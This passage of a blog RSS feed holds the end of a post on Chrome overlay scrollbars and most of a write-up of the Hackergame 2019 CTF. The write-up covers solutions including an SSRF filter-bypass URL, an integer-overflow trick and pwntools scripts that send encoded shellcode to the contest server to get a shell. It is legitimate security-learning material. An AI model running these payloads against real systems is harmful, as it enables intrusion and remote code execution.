+<p>值得一提的是，Overlay Scrollbars 在 Chrome OS 下是默认启用的，因此 Chromium 的代码库中仍存在重叠式滚动条的相关代码。虽然目前仍有较复杂的方法再次启用该功能，但我强烈建议对该功能有需求的用户，在 <a rel="noreferrer noopener" aria-label="reddit (opens in a new tab)" href="https://www.reddit.com/r/chrome/comments/dq48n6/where_the_fuck_did_overlayscrollbars_go/" target="_blank">reddit</a> 以及 <a rel="noreferrer noopener" aria-label="crbug (opens in a new tab)" href="https://bugs.chromium.org/p/chromium/issues/list" target="_blank">crbug</a> 反馈该问题，要求 Google 加回并继续维护 Windows 平台下的该功能。</p>
+
+
+
+<h2>一些吐槽</h2>
+
+
+
+<p>Chrome 市占率垄断之后越来越不考虑老用户的感受，很多用户仍有需求的功能想砍就砍，例如网页编码选择、<code>blocking webRequest</code> API（用于广告屏蔽）。</p>
+
+
+
+<p>换浏览器？然而 Firefox 在 Windows 下的体验也很糟糕，Firefox 的高精度触摸板、触摸屏支持比起 Edge 与 Chrome 要差很多。此外，微软现在也加入了 Chromium 的开发，未来 Firefox 与 Chrome 在 Windows 下的体验差距很可能只会越来越大。</p>
+
+
+
+<p><strong>Coxxs</strong></p>
+
+
+
+<blockquote class="wp-block-quote"><p>本文由 Coxxs 原创，转载须注明原文链接：<a href="https://dev.moe/1413">https://dev.moe/1413</a></p></blockquote>
+<p><a rel="nofollow" href="https://dev.moe/1413">在 Chrome 78 启用 overlay-scrollbars</a>最先出现在<a rel="nofollow" href="https://dev.moe">Coxxs</a>。</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://dev.moe/1413/feed</wfw:commentRss>
+			<slash:comments>10</slash:comments>
+		
+		
+		<post-id xmlns="com-wordpress:feed-additions:1">1413</post-id>	</item>
+		<item>
+		<title>Hackergame 2019（中科大信安赛）write up</title>
+		<link>https://dev.moe/1321</link>
+					<comments>https://dev.moe/1321#comments</comments>
+		
+		<dc:creator><![CDATA[Coxxs]]></dc:creator>
+		<pubDate>Tue, 22 Oct 2019 04:00:26 +0000</pubDate>
+				<category><![CDATA[Code]]></category>
+		<guid isPermaLink="false">https://coxxs.me/?p=1321</guid>
+
+					<description><![CDATA[<p>过去一年并没有怎么打 CTF，不少比赛难度对我而言偏高，自己也没有特别拿手的题型。不过去年参加的 Hacker<a class="more-link" href="https://dev.moe/1321">继续阅读<span class="screen-reader-text">"Hackergame 2019（中科大信安赛）write up"</span></a></p>
+<p><a rel="nofollow" href="https://dev.moe/1321">Hackergame 2019（中科大信安赛）write up</a>最先出现在<a rel="nofollow" href="https://dev.moe">Coxxs</a>。</p>
+]]></description>
+										<content:encoded><![CDATA[
+<p>过去一年并没有怎么打 CTF，不少比赛难度对我而言偏高，自己也没有特别拿手的题型。不过去年参加的 <a href="https://dev.moe/879">Hackergame 2018</a> 倒是玩得很开心，题目设计较有趣，难易度分布也较均匀。同时，由于赛程安排较长，在比赛的过程中能够有时间学习、消化新知识。</p>
+
+
+
+<p>今年的 Hackergame 算法题与数学题稍多，有些题目最后还是网上找到别人写好的算法来求解，更像是搜索能力竞赛（<s>其实是我太菜了</s>）。既然比赛难度循序渐进，本 write up 也会包含进几道简单却有趣的题目，难度由简单到中等循序渐进。至于为什么不整理较难的题&#8230;（<s>原因刚才说过了</s>）</p>
+
+
+
+<span id="more-1321"></span>
+
+
+
+<p>同去年一样，官方也发布了 write up：<a href="https://github.com/ustclug/hackergame2019-writeups" target="_blank" rel="noreferrer noopener" aria-label=" (opens in a new tab)">GitHub</a></p>
+
+
+
+<hr class="wp-block-separator"/>
+
+
+
+<h2>白与夜 100</h2>
+
+
+
+<blockquote class="wp-block-quote"><p>这是一个关于白猫，嗯不对，关于黑猫的故事。 </p><cite><a rel="noreferrer noopener" aria-label=" (opens in a new tab)" href="https://archive.is/fmnlW" target="_blank">题目</a></cite></blockquote>
+
+
+
+<p>题目里是一张白猫的图片，又不断暗示这只猫其实是<strong>黑猫</strong>。将图片下载后，发现图片是一张<strong>半透明</strong>的 png 图片。</p>
+
+
+
+<p>将猫咪放到黑色背景下，原来猫身的“白”色部分其实大部分是透明的，只是放在了白色的网页上才显现出白色。而在黑色背景下，猫身就显现出黑色了。</p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" width="1024" height="505" src="https://coxxs.me/wp-content/uploads/2019/10/nLT8hv2lOCJ-1.1-blackcat-1-1024x505.png" alt="" class="wp-image-1326" srcset="https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-1.1-blackcat-1-1024x505.png 1024w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-1.1-blackcat-1-300x148.png 300w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-1.1-blackcat-1-768x378.png 768w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-1.1-blackcat-1.png 1301w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>
+
+
+
+<p><strong>flag{4_B14CK_C4T}</strong></p>
+
+
+
+<p><strong>题目并不难，不过我也想做出一张这样的图片。</strong>从图中可以看到，黑猫白猫的位置并不相同，并非同一只猫，而更像是两张图片合成起来的。</p>
+
+
+
+<p>我们先试着做一张这样的白猫图。将不透明的白猫图取出，并使用 GIMP 将其中的白色转换为透明色。这样一来，图片中就只剩下了透明度不同的纯黑色（以及一些完全透明的部分）。在白色背景下，修改后的白猫图与原图比看不出什么区别，但在黑色背景下，这张图无法看出任何内容。</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter is-resized"><img loading="lazy" src="https://coxxs.me/wp-content/uploads/2019/10/nLT8hv2lOCJ-1.3-blackcat.png" alt="" class="wp-image-1334" width="255" height="252" srcset="https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-1.3-blackcat.png 650w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-1.3-blackcat-300x296.png 300w" sizes="(max-width: 255px) 100vw, 255px" /><figcaption>试试在黑色背景下看这张图？</figcaption></figure></div>
+
+
+
+<p>这张图实际上是由完全透明的部分，以及透明度各不相同的纯黑色(#000000)像素构成。举个例子，一个不透明的灰色(#CCCCCC)像素，与不透明度为 20% 的纯黑色(#000000)像素在白色背景下是看不出区别的。</p>
+
+
+
+<p>以此类推，如果继续更改白猫图各个像素的颜色以及透明度，就能够在不改变白色背景下所看到的白猫的情况下，在黑色背景下展现出另一张图片。事实上，这也是一些聊天工具里流传的“点开就会变”的图片的原理。</p>
+
+
+
+<p>按照上述原理，写了一个 node.js 工具，用于生成这样的图片。项目地址： <a href="https://github.com/Coxxs/image-hide">https://github.com/Coxxs/image-hide</a></p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter is-resized"><img loading="lazy" src="https://coxxs.me/wp-content/uploads/2019/10/ys8.png" alt="" class="wp-image-1333" width="262" height="262" srcset="https://dev.moe/wp-content/uploads/2019/10/ys8.png 400w, https://dev.moe/wp-content/uploads/2019/10/ys8-150x150.png 150w, https://dev.moe/wp-content/uploads/2019/10/ys8-300x300.png 300w" sizes="(max-width: 262px) 100vw, 262px" /><figcaption>丹娜超可爱！（不过丹娜在哪呢）</figcaption></figure></div>
+
+
+
+<h2>信息安全 2077 150</h2>
+
+
+
+<blockquote class="wp-block-quote"><p>2077 年很快到来了。此时正值祖国 128 周年华诞，中国科学技术大学也因其王牌专业信息安全，走出国门，成为了世界一流大学。作为向信息安全专业输送人才的重要渠道，第 64 届信息安全大赛也正在如火如荼地开展着。<br>千里之行，始于足下。作为一名渴望进入信息安全专业的学生，你的第一个任务是拿到第 64 届信息安全大赛的签到题的 flag。我们已经为你找到了签到题的入口[1]，你只需要把&nbsp;<code>flag.txt</code>&nbsp;的内容读出来就可以了。<br>注：为了照顾到<a rel="noreferrer noopener" href="https://www.zhihu.com/question/298070646" target="_blank">使用黑曜石浏览器的用户</a>，第 64 届信息安全大赛的签到题决定沿袭之前 63 届信息安全大赛的惯例，仍然基于 HTTP 1.x。当然了，使用其他浏览器也是可以顺利完成任务的。 </p><cite>[1] <a href="https://gist.github.com/Coxxs/590e47cd4ee28aa14c671b4c6e3984ec" target="_blank" rel="noreferrer noopener" aria-label="网页源码 (opens in a new tab)">网页源码</a></cite></blockquote>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" width="1024" height="492" src="https://coxxs.me/wp-content/uploads/2019/10/nLT8hv2lOCJ-2.1-2077-1024x492.png" alt="" class="wp-image-1335" srcset="https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-2.1-2077-1024x492.png 1024w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-2.1-2077-300x144.png 300w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-2.1-2077-768x369.png 768w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-2.1-2077.png 1060w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>
+
+
+
+<p>打开网页，页面展示出一个倒计时，似乎要等到 2077 年才能查看 flag。在源码中可以看到页面在向 flag.txt 文件发起一个请求，并指定了 <code>User-Agent</code> 以及 <code>If-Unmodified-Since</code> 的 HTTP 头。</p>
+
+
+
+<p>由于浏览器安全策略原因，浏览器并未采用所指定的 <code>User-Agent</code>。抓包并将 <code>User-Agent</code> 改为黑曜石浏览器，再将 <code>If-Unmodified-Since</code> 头改为 2077 年，即可获得 flag。</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter is-resized"><img loading="lazy" src="https://coxxs.me/wp-content/uploads/2019/10/nLT8hv2lOCJ-2.2-2077-1024x699.png" alt="" class="wp-image-1337" width="433" height="295" srcset="https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-2.2-2077-1024x699.png 1024w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-2.2-2077-300x205.png 300w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-2.2-2077-768x524.png 768w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-2.2-2077.png 1173w" sizes="(max-width: 433px) 100vw, 433px" /></figure></div>
+
+
+
+<p><strong>flag{Welc0me_to_competit1on_in_2077}</strong></p>
+
+
+
+<h2>网页读取器 150</h2>
+
+
+
+<blockquote class="wp-block-quote"><p>今年，刚刚学会网络编程的小 T 花了一点时间，写了一个非常简单的网站：输入一个 URL，返回对应的内容。<br>不过小 T 想对用户访问的站点进行一些限制，所以他决定自己来解析 URL，阻止不满足要求的请求。这样也顺便解决了 SSRF（Server-Side Request Forgery, 服务器端请求伪造）的问题。<br>想象很美好，但小 T 真的彻底解决了问题吗？ </p><cite><a href="https://archive.is/7zybw" target="_blank" rel="noreferrer noopener" aria-label=" (opens in a new tab)">题目</a> <a rel="noreferrer noopener" aria-label="源码 (opens in a new tab)" href="https://gist.github.com/Coxxs/58af56086892774a891ef515ab632e2d" target="_blank">源码</a></cite></blockquote>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" width="1024" height="804" src="https://coxxs.me/wp-content/uploads/2019/10/nLT8hv2lOCJ-3.1-1024x804.png" alt="" class="wp-image-1340" srcset="https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-3.1-1024x804.png 1024w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-3.1-300x235.png 300w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-3.1-768x603.png 768w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-3.1.png 1431w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>
+
+
+
+<p>根据题面，问题应该是出在小 T 写的 URL 解析代码中。查看代码，发现在第二步剥离 URL 中的用户名时就出了问题，他将 <code>@</code> 符号前的所有文本都视为了用户名部分。</p>
+
+
+
+<p>输入 <code>http://web1/flag?@example.com</code>，绕过判断，获取 flag。</p>
+
+
+
+<p>这道题很好的演示了自己写解析函数可能带来的问题。实际项目中，自己编写 URL 解析虽不一定会有这样一眼能看出的安全问题，但却可能隐藏着更加难以发现的安全问题。<strong>因此这类解析最好还是不要自己造轮子，使用语言自身提供的解析函数，或使用比较流行的解析库会更靠谱。</strong></p>
+
+
+
+<p><strong>flag{UrL_1S_n0t_SO_easy}</strong></p>
+
+
+
+<h2>达拉崩吧大冒险 150</h2>
+
+
+
+<blockquote class="wp-block-quote"><p> 某一天，C 同学做了一个神奇的梦。在梦中，他来到了蒙达鲁克硫斯伯古比奇巴勒城…… </p></blockquote>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter is-resized"><img loading="lazy" src="https://coxxs.me/wp-content/uploads/2019/10/nLT8hv2lOCJ-4.1-934x1024.png" alt="" class="wp-image-1341" width="534" height="585" srcset="https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-4.1-934x1024.png 934w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-4.1-274x300.png 274w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-4.1-768x842.png 768w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-4.1.png 1583w" sizes="(max-width: 534px) 100vw, 534px" /><figcaption>题目截图</figcaption></figure></div>
+
+
+
+<p>非常欢乐的一道题，是一个勇者斗恶龙的故事！可以一边听<a rel="noreferrer noopener" href="https://www.bilibili.com/video/av9372087/" target="_blank">达拉崩吧</a>一边做题！ </p>
+
+
+
+<p>在王大妈这里，买入鲜美香脆可口甘甜现炸童子鸡可提升攻击力。通过修改网页代码，发现支持买入负数只鸡。此时攻击力会<strong>降低</strong>，而金钱会<strong>增加</strong>。但我们需要的是增加攻击力去打恶龙昆图库塔卡提考特苏瓦西拉松，钱再多也没用啊！</p>
+
+
+
+<p>多次尝试后可得出，先买入 -MaxInt64 只（-9223372036854775808）童子鸡，此时攻击力会变成非常小的一个负数。再买入 -1 只童子鸡，攻击力会溢出，变为非常大的一个正数。（实际有很多种买法，让攻击力变得太小溢出即可）</p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" width="1024" height="516" src="https://coxxs.me/wp-content/uploads/2019/10/nLT8hv2lOCJ-4.2-1024x516.png" alt="" class="wp-image-1342" srcset="https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-4.2-1024x516.png 1024w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-4.2-300x151.png 300w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-4.2-768x387.png 768w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-4.2.png 1231w" sizes="(max-width: 1024px) 100vw, 1024px" /><figcaption>与隔壁王大妈的交<img src="https://s.w.org/images/core/emoji/13.1.0/72x72/2642.png" alt="♂" class="wp-smiley" style="height: 1em; max-height: 1em;" />易现场</figcaption></figure>
+
+
+
+<p>获得 9223372036854776000 的攻击力后，去干恶龙即可。</p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" width="1024" height="1024" src="https://coxxs.me/wp-content/uploads/2019/10/nLT8hv2lOCJ-4.3-1024x1024.png" alt="" class="wp-image-1343" srcset="https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-4.3-1024x1024.png 1024w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-4.3-150x150.png 150w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-4.3-300x300.png 300w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-4.3-768x768.png 768w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-4.3.png 1600w" sizes="(max-width: 1024px) 100vw, 1024px" /><figcaption> 恶龙昆图库塔卡提考特苏瓦西拉松被<img src="https://s.w.org/images/core/emoji/13.1.0/72x72/2642.png" alt="♂" class="wp-smiley" style="height: 1em; max-height: 1em;" />干现场</figcaption></figure>
+
+
+
+<p><strong>flag{what_an_amazing_dream}</strong></p>
+
+
+
+<h2>Happy LUG 150</h2>
+
+
+
+<blockquote class="wp-block-quote"><p>在今年信安大赛命题组的内部聊天记录中，出现次数最多的 emoji 是什么？<br>答案是：「<img src="https://s.w.org/images/core/emoji/13.1.0/72x72/1f602.png" alt="😂" class="wp-smiley" style="height: 1em; max-height: 1em;" />」（喜极而泣的表情，Face with Tears of Joy）。这是大家最喜欢使用的 emoji 之一。<br>或许是因为这个原因，最近几天，命题组某位同学收到了一张神秘的字条。<br>看起来是一个域名，但里面怎么会有 <img src="https://s.w.org/images/core/emoji/13.1.0/72x72/1f602.png" alt="😂" class="wp-smiley" style="height: 1em; max-height: 1em;" /> 这个 emoji？而且，虽然浏览器访问不了，<strong>但这个域名确实是存在着的。</strong><br>你能解开其中隐藏着的信息吗？ </p></blockquote>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter is-resized"><img loading="lazy" src="https://coxxs.me/wp-content/uploads/2019/10/nLT8hv2lOCJ-5.1-1024x768.png" alt="" class="wp-image-1347" width="389" height="291" srcset="https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-5.1-1024x768.png 1024w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-5.1-300x225.png 300w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-5.1-768x576.png 768w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-5.1.png 2048w" sizes="(max-width: 389px) 100vw, 389px" /><figcaption>题目图片</figcaption></figure></div>
+
+
+
+<p>题目其实暗示很明显了，域名存在却打不开，我们则自然要去找为什么“打不开”。<a href="https://en.wikipedia.org/wiki/Emoji_domain">Emoji 域名</a>并不是什么新鲜事了，与中文域名原理相同，是将包含特殊字符的字串转换为 <a rel="noreferrer noopener" aria-label="Punycode (opens in a new tab)" href="https://en.wikipedia.org/wiki/Punycode" target="_blank">Punycode</a>。而我们的浏览器就是我们手边的转换工具。</p>
+
+
+
+<p>将 <code>&#x1f602;.hack.ustclug.org</code> 这个域名复制到地址栏，回车后复制回来，可以获得实际域名 <code>xn--g28h.hack.ustclug.org</code>，前面的 <code>xn--g28h</code> 就是 Punycode 了。</p>
+
+
+
+<p>接着我们要解决这个网址“打不开”的问题。要访问一个域名代表的网站，浏览器首先会对域名做 DNS 解析。我们用 dig 命令来看看解析结果吧（也可使用其他的 <a href="https://dns.google.com" target="_blank" rel="noreferrer noopener" aria-label="DNS 解析工具 (opens in a new tab)">DNS 解析工具</a>）。</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="shell" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">$ dig xn--g28h.hack.ustclug.org
+dig: 'xn--g28h.hack.ustclug.org.' is not a legal IDNA2008 name (string contains a disallowed character), use +noidnout
+
+$ dig xn--g28h.hack.ustclug.org +noidnout
+
+; &lt;&lt;>> DiG 9.11.5-P1-1ubuntu2.5-Ubuntu &lt;&lt;>> xn--g28h.hack.ustclug.org +noidnout
+;; global options: +cmd
+;; Got answer:
+# ... (此处省略)
+;xn--g28h.hack.ustclug.org.     IN      A</pre>
+
+
+
+<p>可以看出这个域名查询请求并没有回应 A 记录（使用 <code>dig AAAA xn--g28h.hack.ustclug.org</code> 测试，也没有 AAAA 记录），浏览器找不到对应的 IP，自然无法访问。那试试看其他常见的记录类型呢？</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="shell" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">root@localhost:~# dig TXT xn--g28h.hack.ustclug.org +noidnout
+
+; &lt;&lt;>> DiG 9.11.5-P1-1ubuntu2.5-Ubuntu &lt;&lt;>> TXT xn--g28h.hack.ustclug.org +noidnout
+;; global options: +cmd
+;; Got answer:
+# ... (此处省略)
+;; QUESTION SECTION:
+;xn--g28h.hack.ustclug.org.     IN      TXT
+
+;; ANSWER SECTION:
+xn--g28h.hack.ustclug.org. 60   IN      TXT     "flag{DN5_C4N_H4VE_em0ji_haha}"</pre>
+
+
+
+<p>当使用常用作字串的 TXT 记录类型时，返回了 flag。</p>
+
+
+
+<p><strong>flag{DN5_C4N_H4VE_em0ji_haha}</strong></p>
+
+
+
+<h2>Shell 骇客 400</h2>
+
+
+
+<blockquote class="wp-block-quote"><p> 你知道什么是 shellcode 吗？也许这可以帮助你了解更多！ </p><cite>nc 202.38.93.241 10000<br>nc 202.38.93.241 10002<br>nc 202.38.93.241 10004</cite></blockquote>
+
+
+
+<div class="wp-block-file"><a href="https://coxxs.me/wp-content/uploads/2019/10/ShellHacker.zip">ShellHacker.zip</a><a href="https://coxxs.me/wp-content/uploads/2019/10/ShellHacker.zip" class="wp-block-file__button" download>下载</a></div>
+
+
+
+<p>似乎是一道萌新向的 pwn 题，题目中也给出了源代码。正好我也不会 pwn，那就借着这题初步了解下。</p>
+
+
+
+<p>三道小题都直接调用了用户输入的内容，后两个小问则额外对用户输入的内容做了限制：第二问为 32 位程序，限制只能输入 <code>[0-9A-Z]{,200}</code>，第三问为 64 位程序，限制只能输入 <code>0x32 ~ 0x7e</code> 范围内的字符。</p>
+
+
+
+<p>简单学习了一下 pwntools 的使用，第一小题 Python 代码如下：</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">from pwn import *
+context(arch = 'amd64', os = 'linux')
+
+r = remote('202.38.93.241', 10000)
+print r.recvuntil(':', drop=True)
+r.send('[选手token]\r\n')
+shellcode = asm(shellcraft.sh())
+r.send(shellcode)
+r.interactive()</pre>
+
+
+
+<p>进入 Shell 后 <code>ls</code> 列目录，<code>cat flag</code> 获得 flag 文件的内容。</p>
+
+
+
+<p>后两小题对输入字符做了限制，尝试用 <code>pwnlib.encoders</code> 生成符合条件的 shellcode，但并未能成功。后来参考一位<a rel="noreferrer noopener" aria-label="大神的文章 (opens in a new tab)" href="https://www.jianshu.com/p/8ae8c055e35c" target="_blank">大神的文章</a>，使用 <a rel="noreferrer noopener" aria-label="alpha3.py (opens in a new tab)" href="https://github.com/SkyLined/alpha3" target="_blank">alpha3.py</a> 对 pwnlib 生成出的 shellcode 进行转换，最终成功执行 shellcode。</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">from pwn import *
+context(arch = 'i386', os = 'linux')
+
+r = remote('202.38.93.241', 10002)
+print r.recvuntil(':', drop=True)
+r.send('[选手token]\r\n')
+r.send('PYVTX10X41PZ41H4A4I1TA71TADVTZ32PZNBFZDQC02DQD0D13DJE2O0Z2G7O1E7M04KO1P0S2L0Y3T3CKL0J0N000Q5A1W66MN0Y0X021U9J622A0H1Y0K3A7O5I3A114CKO0J1Y4Z5F06')
+r.interactive()</pre>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">from pwn import *
+context(arch = 'amd64', os = 'linux')
+
+r = remote('202.38.93.241', 10004)
+print r.recvuntil(':', drop=True)
+r.send('[选手token]\r\n')
+r.send('Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t')
+r.interactive()</pre>
+
+
+
+<h2>小 U 的加密 200</h2>
+
+
+
+<blockquote class="wp-block-quote"><p>小 U 是一位可爱的萌新，前不久开始学习编程。最近，他刚学了位运算，就写了个小程序来「加密」自己的文件。我们拿到了一份经过他加密之后的文件（据称这是一个音频文件），你能否还原原始文件的内容，找到 flag？<br>注：flag 中的字符串全部为英文小写字符。 </p></blockquote>
+
+
+
+<div class="wp-block-file"><a href="https://coxxs.me/wp-content/uploads/2019/10/flag.zip">flag.enc</a><a href="https://coxxs.me/wp-content/uploads/2019/10/flag.zip" class="wp-block-file__button" download>下载</a></div>
+
+
+
+<p>根据题目，刚学了位运算的小 U 当然会选择用异或运算来加密文件啦！由于完全没有密钥，很可能是用了同一个字节异或了整个文件。</p>
+
+
+
+<p>一开始尝试了使用 <code>0x00 - 0xFF</code> 分别对文件头进行异或，看看能不能找到熟悉的文件头，但却啥都找不着。</p>
+
+
+
+<p>稍作思考后，看到这个文件中有特别多的 <code>0x39</code> 字节。对于大多数二进制文件来说，文件里有许多 <code>0x00</code> 是再正常不过的事了，而 <code>0x00 xor 0x39 = 0x39</code>，因此整个文件很可能是被 <code>0x39</code> 异或了。</p>
+
+
+
+<p>将文件还原后，文件头是 <code>MThd</code>，搜索后才知道，原来这是 MIDI 文件。将“解密”后的文件重命名为 <code>flag.mid</code>。</p>
+
+
+
+<div class="wp-block-file"><a href="https://coxxs.me/wp-content/uploads/2019/10/flag.mid">flag.mid</a><a href="https://coxxs.me/wp-content/uploads/2019/10/flag.mid" class="wp-block-file__button" download>下载</a></div>
+
+
+
+<p>直接播放只能听到一串杂乱的音符，用 MIDI 编辑器打开看看，原来是用音符拼成了 flag。（让我想起我以前出的一道题 = =##）</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter is-resized"><img loading="lazy" src="https://coxxs.me/wp-content/uploads/2019/10/nLT8hv2lOCJ-6.1-1024x507.png" alt="" class="wp-image-1354" width="316" height="156" srcset="https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-6.1-1024x507.png 1024w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-6.1-300x149.png 300w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-6.1-768x380.png 768w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-6.1.png 1928w" sizes="(max-width: 316px) 100vw, 316px" /></figure></div>
+
+
+
+<p><strong>flag{justxorandmidi}</strong></p>
+
+
+
+<h2>天书残篇 250</h2>
+
+
+
+<blockquote class="wp-block-quote"><p>古尔丹的魔法书<br>很久很久以前，兽族部落还未建立起来。古尔丹的早期经历鲜有人知，他原本是影月氏族的一员，在学习利用萨满的元素之力时展现了非凡的天赋。因此被光荣地选为萨满长老耐奥祖的学徒。长老十分喜爱自己的这位学生，于是长老将千年流传下来的天书交给了他，长老对着年轻的古尔丹说：“这是一本天书，里面记录了非凡的魔法，如果你能参悟其中的奥秘，你将能带领族人成就一番伟大事业。”年轻的古尔丹从小渴望力量，他接过了长老的书，认真的看了起来。<br>经过一段时间，古尔丹掌握了天书的奥秘，他利益熏心，对于力量的渴望吞噬了他的理智。之后便有了燃烧军团&#8230;&#8230;..<br>古尔丹死后，他的头骨变成了某种与恶魔之力沟通的信物。古尔丹的一小片灵魂仍然寄存在他的头骨之中，持有之人能够听到他的私语——即使在死后，这位术士仍然十分危险。耐奥祖曾经用这头骨打开了德拉诺通往其他世界的传送门，后来卡德加又用它摧毁了黑暗之门。黑暗之门被毁后，卡德加为了逃离此处而在匆忙之间将头骨丢在了德拉诺某处耐奥祖创造的扭曲虚空之中。多年之后它又在艾泽拉斯重新出现，这一次它被燃烧军团用于污染费伍德的森林。从死亡骑士阿尔萨斯处了解到它的存在后，伊利丹·怒风找到并带走了头骨，在吸收其力量之后变成了半暗夜精灵半恶魔的状态。古尔丹的记忆依靠头骨内的术士魔法和陵墓墙上的符文继续存在着，伊利丹通过头骨内古尔丹的记忆找到了陵墓，而玛维·影歌则找到了符文。在陵墓坍塌之后，古尔丹存在过的最后证明也消失无踪。<br>我们找到了那本启示古尔丹的魔法书的残卷，它因为年代久远仅剩下零落几页，但是书籍里尘封着伟大力量却在召唤着你。年轻人参悟这伟大的力量吧！ </p></blockquote>
+
+
+
+<div class="wp-block-file"><a href="https://coxxs.me/wp-content/uploads/2019/10/天书残篇.zip">天书残篇</a><a href="https://coxxs.me/wp-content/uploads/2019/10/天书残篇.zip" class="wp-block-file__button" download>下载</a></div>
+
+
+
+<p>题目很长，啥提示都看不出来。文件中只有三种字符，空格、Tab、换行。一开始试了各种方法，一直都没能解开&#8230; 直到在一个并没有聊比赛的群里，看到一位群友发的一张 <a rel="noreferrer noopener" aria-label="Whitespace 编程语言 (opens in a new tab)" href="https://en.wikipedia.org/wiki/Whitespace_(programming_language)" target="_blank">Whitespace 编程语言</a>的百科截图&#8230;</p>
+
+
+
+<p>在网上找到 <a rel="noreferrer noopener" aria-label="Whitespace 的在线 IDE (opens in a new tab)" href="https://vii5ard.github.io/whitespace/" target="_blank">Whitespace 的在线 IDE</a>，运行这段代码，但这段代码不仅没有向被坑了半天的我打印出答案，竟然还开始反问我要 flag。去年被这比赛的 Malbolge&nbsp;语言玩得半死，今年得吸取教训了——flag 有可能是和去年一样，直接编码在了代码中。</p>
+
+
+
+<p>仔细阅读汇编，看到其中有很多 <code>push 2; add; push x; sub</code> 的操作，或许这就是在试图计算 flag，以便于和用户的输入进行比较。</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter is-resized"><img loading="lazy" src="https://coxxs.me/wp-content/uploads/2019/10/nLT8hv2lOCJ-7.1.png" alt="" class="wp-image-1356" width="183" height="333" srcset="https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-7.1.png 345w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-7.1-165x300.png 165w" sizes="(max-width: 183px) 100vw, 183px" /></figure></div>
+
+
+
+<p>将这部分 push 后的数字提取出，减去 2 后转为字符，并翻转字符串，获得flag。</p>
+
+
+
